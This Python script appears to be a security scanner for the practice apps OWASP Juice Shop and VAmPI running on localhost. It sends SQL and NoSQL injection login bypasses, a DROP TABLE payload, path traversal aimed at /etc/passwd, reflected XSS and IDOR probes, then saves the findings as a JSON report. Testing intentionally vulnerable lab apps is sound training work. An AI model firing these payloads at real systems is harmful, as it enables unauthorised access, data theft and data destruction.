#!/usr/bin/env python3
"""
Enhanced Vulnerable API Tester
Specifically designed for OWASP Juice Shop and VAmPI testing
"""

import sys
import json
import requests
from pathlib import Path
from colorama import init, Fore, Style

# Add the core_scripts directory to Python path
sys.path.insert(0, str(Path(__file__).parent / 'core_scripts'))

from api_security_scanner import Config

init()

def test_juice_shop_vulnerabilities(base_url="http://localhost:3000"):
    """Test OWASP Juice Shop specific vulnerabilities"""
    print(f"{Fore.BLUE}🧃 Testing OWASP Juice Shop Vulnerabilities{Style.RESET_ALL}")
    
    alerts = []
    session = requests.Session()
    
    # Test 1: SQL Injection in login
    try:
        login_payload = {
            "email": "admin'--",
            "password": "anything"
        }
        response = session.post(f"{base_url}/rest/user/login", json=login_payload)
        if "token" in response.text.lower():
            alerts.append({
                'name': 'SQL Injection - Authentication Bypass',
                'risk': 'High',
                'url': f"{base_url}/rest/user/login",
                'description': 'SQL injection allows authentication bypass',
                'confidence': 'High'
            })
            print(f"   {Fore.RED}🔥 FOUND: SQL Injection in login{Style.RESET_ALL}")
    except:
        pass
    
    # Test 2: Admin section access
    try:
        admin_response = session.get(f"{base_url}/administration")
        if admin_response.status_code == 200:
            alerts.append({
                'name': 'Broken Access Control',
                'risk': 'High',
                'url': f"{base_url}/administration",
                'description': 'Admin panel accessible without proper authentication',
                'confidence': 'High'
            })
            print(f"   {Fore.RED}🔥 FOUND: Admin panel exposure{Style.RESET_ALL}")
    except:
        pass
    
    # Test 3: Directory traversal
    try:
        traversal_paths = [
            "/ftp/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/ftp/..%252f..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for path in traversal_paths:
            response = session.get(base_url + path)
            if "root:" in response.text:
                alerts.append({
                    'name': 'Directory Traversal',
                    'risk': 'High',
                    'url': base_url + path,
                    'description': 'Directory traversal allows access to system files',
                    'confidence': 'High'
                })
                print(f"   {Fore.RED}🔥 FOUND: Directory traversal{Style.RESET_ALL}")
                break
    except:
        pass
    
    # Test 4: XSS in search
    try:
        xss_payload = "<script>alert('XSS')</script>"
        search_response = session.get(f"{base_url}/rest/products/search", params={"q": xss_payload})
        if xss_payload in search_response.text:
            alerts.append({
                'name': 'Reflected XSS',
                'risk': 'High',
                'url': f"{base_url}/rest/products/search?q={xss_payload}",
                'description': 'Reflected XSS vulnerability in search functionality',
                'confidence': 'High'
            })
            print(f"   {Fore.RED}🔥 FOUND: XSS in search{Style.RESET_ALL}")
    except:
        pass
    
    # Test 5: Weak password reset
    try:
        reset_response = session.get(f"{base_url}/rest/user/reset-password")
        if reset_response.status_code == 200:
            alerts.append({
                'name': 'Insecure Password Reset',
                'risk': 'Medium',
                'url': f"{base_url}/rest/user/reset-password",
                'description': 'Password reset mechanism may be vulnerable',
                'confidence': 'Medium'
            })
    except:
        pass
    
    return alerts

def test_vampi_vulnerabilities(base_url="http://localhost:5000"):
    """Test VAmPI specific vulnerabilities"""
    print(f"{Fore.BLUE}🧛 Testing VAmPI Vulnerabilities{Style.RESET_ALL}")
    
    alerts = []
    session = requests.Session()
    
    # Test 1: SQLi in user endpoint
    try:
        sqli_payloads = ["1' OR '1'='1", "1'; DROP TABLE users; --"]
        for payload in sqli_payloads:
            response = session.get(f"{base_url}/users/v1/{payload}")
            if "error" in response.text.lower() or "sql" in response.text.lower():
                alerts.append({
                    'name': 'SQL Injection - User Endpoint',
                    'risk': 'High',
                    'url': f"{base_url}/users/v1/{payload}",
                    'description': 'SQL injection vulnerability in user endpoint',
                    'confidence': 'High'
                })
                print(f"   {Fore.RED}🔥 FOUND: SQL Injection in users endpoint{Style.RESET_ALL}")
                break
    except:
        pass
    
    # Test 2: IDOR (Insecure Direct Object Reference)
    try:
        # Try accessing different user IDs
        for user_id in [1, 2, 3, 999]:
            response = session.get(f"{base_url}/users/v1/{user_id}")
            if response.status_code == 200 and "email" in response.text:
                alerts.append({
                    'name': 'Insecure Direct Object Reference',
                    'risk': 'High',
                    'url': f"{base_url}/users/v1/{user_id}",
                    'description': 'IDOR vulnerability allows accessing other users data',
                    'confidence': 'High'
                })
                print(f"   {Fore.RED}🔥 FOUND: IDOR in user access{Style.RESET_ALL}")
                break
    except:
        pass
    
    # Test 3: Weak JWT implementation
    try:
        # Try to register and get JWT
        register_data = {
            "username": "testuser123",
            "password": "password123",
            "email": "test@test.com"
        }
        register_response = session.post(f"{base_url}/users/v1/register", json=register_data)
        
        if "token" in register_response.text:
            alerts.append({
                'name': 'Weak JWT Implementation',
                'risk': 'Medium',
                'url': f"{base_url}/users/v1/register",
                'description': 'JWT token implementation may be vulnerable',
                'confidence': 'Medium'
            })
            print(f"   {Fore.YELLOW}⚠️  FOUND: JWT token exposure{Style.RESET_ALL}")
    except:
        pass
    
    # Test 4: NoSQL Injection
    try:
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password.match(/.*/)"}' 
        ]
        
        for payload in nosql_payloads:
            try:
                response = session.post(f"{base_url}/users/v1/login", 
                                      json={"username": payload, "password": "anything"})
                if response.status_code == 200 and "token" in response.text:
                    alerts.append({
                        'name': 'NoSQL Injection',
                        'risk': 'High',
                        'url': f"{base_url}/users/v1/login",
                        'description': 'NoSQL injection vulnerability in login',
                        'confidence': 'High'
                    })
                    print(f"   {Fore.RED}🔥 FOUND: NoSQL Injection{Style.RESET_ALL}")
                    break
            except:
                continue
    except:
        pass
    
    return alerts

def main():
    """Run enhanced vulnerability testing"""
    config = Config()
    
    print(f"{Fore.CYAN}🎯 ENHANCED VULNERABLE API TESTING{Style.RESET_ALL}")
    print("=" * 60)
    
    all_alerts = []
    
    # Test OWASP Juice Shop
    print(f"\n{Fore.YELLOW}Testing OWASP Juice Shop (localhost:3000)...{Style.RESET_ALL}")
    try:
        requests.get("http://localhost:3000", timeout=3)
        juice_alerts = test_juice_shop_vulnerabilities()
        all_alerts.extend(juice_alerts)
        print(f"   Found {len(juice_alerts)} issues in Juice Shop")
    except:
        print(f"   {Fore.RED}❌ Juice Shop not accessible{Style.RESET_ALL}")
    
    # Test VAmPI
    print(f"\n{Fore.YELLOW}Testing VAmPI (localhost:5000)...{Style.RESET_ALL}")
    try:
        requests.get("http://localhost:5000", timeout=3)
        vampi_alerts = test_vampi_vulnerabilities()
        all_alerts.extend(vampi_alerts)
        print(f"   Found {len(vampi_alerts)} issues in VAmPI")
    except:
        print(f"   {Fore.RED}❌ VAmPI not accessible{Style.RESET_ALL}")
    
    # Generate report
    if all_alerts:
        from datetime import datetime
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = config.reports_dir / f"vulnerable_api_test_{timestamp}.json"
        
        high_severity = [a for a in all_alerts if a.get('risk') == 'High']
        
        report_data = {
            "scan_info": {
                "scan_type": "Enhanced Vulnerable API Testing",
                "targets": ["OWASP Juice Shop", "VAmPI"],
                "timestamp": datetime.now().isoformat(),
                "total_alerts": len(all_alerts),
                "high_severity_count": len(high_severity)
            },
            "alerts": all_alerts
        }
        
        with open(report_path, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"\n{Fore.CYAN}📊 FINAL RESULTS{Style.RESET_ALL}")
        print("=" * 40)
        print(f"Total Vulnerabilities: {len(all_alerts)}")
        print(f"High Severity: {len(high_severity)}")
        print(f"Report saved: {report_path}")
        
        if high_severity:
            print(f"\n{Fore.RED}🚨 HIGH SEVERITY VULNERABILITIES:{Style.RESET_ALL}")
            for i, alert in enumerate(high_severity, 1):
                print(f"{i}. {alert['name']} - {alert['description']}")
        
    else:
        print(f"\n{Fore.GREEN}✅ No vulnerabilities found (or services not running){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Run ./setup_vulnerable_apis.sh to start test services{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
